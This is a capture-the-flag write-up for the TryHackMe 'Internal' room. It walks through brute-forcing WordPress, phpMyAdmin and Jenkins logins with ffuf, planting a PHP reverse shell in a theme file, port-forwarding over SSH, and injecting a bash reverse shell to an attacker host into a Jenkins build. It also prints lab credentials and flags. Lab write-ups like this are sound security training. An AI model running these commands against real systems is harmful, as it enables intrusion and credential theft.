# Lab Report - Internal


# Overview 
- **Difficulty**: Hard 
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/internal

## Resolution Summary 
**We discovered available services with an `Nmap` scan, revealing SSH and HTTP. We enumerated hidden directories with `Gobuster`, uncovering a `WordPress` instance and a `phpMyAdmin` portal. We brute-forced the WordPress login with `ffuf`, gaining admin access and finding credentials in a private post. We then injected a PHP reverse shell into a theme file to gain initial foothold. From there, we retrieved database credentials from `wp-config.php` and discovered internally running services with `ss -tuln`. We exposed a local `Jenkins` instance via SSH reverse port forwarding, brute-forced its login with `ffuf`, and gained RCE by injecting a reverse shell into a build project. Finally, we found plaintext root credentials in a text file within the Jenkins Docker container, switched back to our shell as `aubreanna`, and escalated to root.**

# Information Gathering 
- **Since we were given an IP address, we started by performing an `Nmap` scan on the target. We added the `-sV` flag in order to find the software's versions:** 
```bash
sudo nmap -sV 10.82.166.88
```
	- Adding the -p- flag did not provide additional results.

- **We found that the following services were available:** 
```bash 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

- **To begin with, we focused on the web application on port 80.**

## HTTP (80)
- **We were greeted by the default Apache2 home page.** 
- **Therefore, we began fuzzing for hidden directories using `Gobuster`:**
```bash
gobuster dir -u http://10.82.166.88/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -x txt -t 64
```

- **In the mean time, we investigated the Source page, but we did not find anything relevant there.** 

- **Based on `Gobuster` output, we found the following directories interesting:**
```bash
/wordpress            (Status: 301) [Size: 318] [--> http://10.82.157.202/wordpress/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.82.166.88/phpmyadmin/]
```

### Idea 1: Focusing on `phpmyadmin` version 4.6.6 
- **Upon accessing the web page on `/phpmyadmin`, we found a login form.** 
- **We began by manually trying some common usernames, hoping to be able to spot differences in reflected error messages.** 

- **We noticed that using `root` as username triggered the following error:**
```bash
mysqli_real_connect(): (HY000/1698): Access denied for user 'root'@'localhost'
```

- **Meanwhile using other usernames lead to this error message:** 
```bash
mysqli_real_connect(): (HY000/1045): Access denied for user 'dummy '@'localhost' (using password: YES)
```

- **Our first idea was to try an enumerate a plausible list of usernames by filtering length responses.** 

- **For that, we started by making a login request, which we intercepted with `Burp Suite` in order to analyze required fields before brute-forcing.** 
- **We found the following required fields (from `Burp Suite Repeater`):**
```bash
Cookie: pmaCookieVer=5; phpMyAdmin=vivnl684p56l518n7eqk9k7bom; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci

pma_username=test&pma_password=test&server=1&target=index.php&token=d2bebb3220666da56602a51e6e54cb98
```

- **We decided to use `ffuf` for username enumeration, we filtered attempts by ignoring those who have the `(using password: YES)` error message:** 
```bash 
ffuf -u http://10.82.166.88/phpmyadmin/index.php -X POST -d "pma_username=FUZZ&pma_password=test&server=1&target=index.php&token=d2bebb3220666da56602a51e6e54cb98" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: pmaCookieVer=5; phpMyAdmin=vivnl684p56l518n7eqk9k7bom; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fr "(using password: YES)"
```

- **In the mean time, we tried to brute force the root user's password with `ffuf` again:**
```bash
ffuf -u http://10.82.157.202/phpmyadmin/index.php -X POST -d "pma_username=root&pma_password=FUZZ&server=1&target=index.php&token=a27a7ba4b340001e6ec49ac27af597b2" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: pmaCookieVer=5; phpMyAdmin=vivnl684p56l518n7eqk9k7bom; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci" -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt -fc 200
```
### Idea 2: Focusing on `wordpress` version 5.4.2
- **The presence of such directory hinted us that the website is running WordPress.** 
- **To begin with, we access the login portal at `http://internal.thm/blog/wp-login.php`.** 

- **After testing common usernames, we found that we could enumerate users based on the error message generated. For example, we found that `admin` was a valid username.**

- **We used the following command to enumerate additional usernames, we first did not include the  `-fs` flag in order to get the size of responses (invalid usernames) we would want to filter out:**
```bash
ffuf -u http://internal.thm/blog/wp-login.php -X POST -d "log=FUZZ&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fs 4799
```
	- It did not prove to be useful to do so

- **In the mean time, we tried to brute force the admin user's password with `ffuf` again:**
```bash
ffuf -u http://internal.thm/blog/wp-login.php -X POST -d "log=admin&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -w /home/kali/Downloads/rockyou.txt -fc 200
```

 - **And we found the following credentials, allowing us to gain access to the admin dashboard:**
	 - **`admin:my2boys`**

# Exploitation 
- **After navigating the admin panel, we took a look at the available posts, which proved useful as there was a private post containing credentials:** 
	- **`william:arnold147`**

- **However, since we had access to the admin panel, we edited the `404.php` file in the Theme editor and replaced it with Pentestmonkey's PHP reverse shell.** 
- **After that, we navigated to the following URL in order to gain a RCE:** **`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`**

- **Once we dropped inside a shell, we stabilized it using:**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Use Ctrl + Z to background the shell
stty raw -echo; fg
```

- **We found another user `adreanna` but we did not have sufficient privileges to access its home directory.** 
- **Hence, we attempted to read the WordPress configuration file:** 
```bash
cat /var/www/html/wordpress/wp-config.php
#Results
/** MySQL database username */
define( 'DB_USER', 'wordpress' );
/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );
```

- **And since `PHPMyAdmin` relies on MySQL databases, we thought about using those credentials `wordpress:wordpress123` in order to authenticate on the login portal at: `http://10.82.186.57/phpmyadmin`**

- **After gaining access to the website, we found the following hash for the admin user (WordPress) which would likely coincide with the plaintext password we found earlier:** 
	- **`$P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/`**

- **From there, the `phpmyadmin` website did not seem to bear any sensitive information, hence we moved back to our reverse shell.** 

- **The idea we had is to start to pivot internally. For that purpose, we used the following command in order to reveal hidden service running locally:**
```bash 
ss -tuln
```

- **Which allowed us to discover 2 interesting services running on port `8080` and `44461`.** 
- **Since they were running locally, we performed an SSH reverse port forwarding by using this command on the target:** 
```bash
ssh -R 9000:127.0.0.1:8080 [attacker user]@[attacker IP]
#We focused on the port 8080 first
```
	-Note: Beforehand, make sure that ssh is running on your machine with sudo systemctl start ssh

- **Finally, we could access the web page from our machine using the following URL: `http://localhost:9000`**
## HTTP (8080)
- **We were greeted by a Jenkins login page.** 
- **We immediately tried our previously found credentials (which we did not use yet) : `william:arnold147`, but they were no use.** 

- **To begin with, we tried to brute-force the login page using the following command and `admin` as a user:** 
```bash 
ffuf -u http://localhost:9000/j_acegi_security_check -X POST -d "j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: JSESSIONID.eeac429d=node0lq7wyvz517b214vpqy02z7iqj2.node0" -w /home/kali/Downloads/rockyou.txt -fr 'loginError'
```

- **Hence, we were able to get a valid pair of credentials and gain access to the Jenkins application:**
	- **`admin:spongebob`**

- **Here, since Jenkins allows to build projects, in which code can be remotely executed, we decided to create a project, inject the `whoami` command to confirm that we have have RCE then run the build:** 
```bash
Started by user [admin](http://localhost:9000/user/admin)
Running as SYSTEM
Building in workspace /var/jenkins_home/workspace/test
[test] $ /bin/sh -xe /tmp/jenkins6894010683867611779.sh
+ whoami
jenkins
Finished: SUCCESS
```

- **Hence, we decided to inject a reverse shell:** 
```bash
bash -c 'bash -i >& /dev/tcp/[attacker IP]/4444 0>&1'
```

# Privilege Escalation 
## First Step
- **Once we gained RCE, we looked for interesting files by using:**
```bash 
find / -type f -name "*.txt" 2>/dev/null
```

- **Therefore, we found a text file `wp-save.txt` which had the credentials of a another user:**
```bash
cat /opt/wp-save.txt
#Result
Bill,
Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
aubreanna:bubb13guM!@#123
```

- **Hence, we gained several information:** 
	- **A pair of credentials: `aubreanna:bubb13guM!@#123`**
	- **A potential username: `Bill`**

- **Given that, we were able to access the first flag `THM{int3rna1_fl4g_1}` and another text file mentioning a Jenkins instance running locally on port `8080`.**
## Second Step
- **Once we got a shell from the Jenkins instance, we looked for any valuable text file which could provide any additional information:**
```bash
find / -type f -name '*.txt' 2>/dev/null
```

- **We found the following file `/opt/note.txt`, which provided us with root credentials:**
	- **`root:tr0ub13guM!@#123`**

- **However, since we were in a Docker container, we were not able to use our credentials yet.** 
- **We got back to our webshell, were we last authenticated as `aubreanna`, we changed users to root and accessed the last flag.** 
# Trophy 
**User.txt → `THM{int3rna1_fl4g_1}`** 

**Root.txt → `THM{d0ck3r_d3str0y3r}`**

# Lessons Learned
- **Try Multiple Wordlists.**
- **Pay more attention to files/info you discover/enumerate.**
- **Always try admin and root as users (alongside the others you might find).**
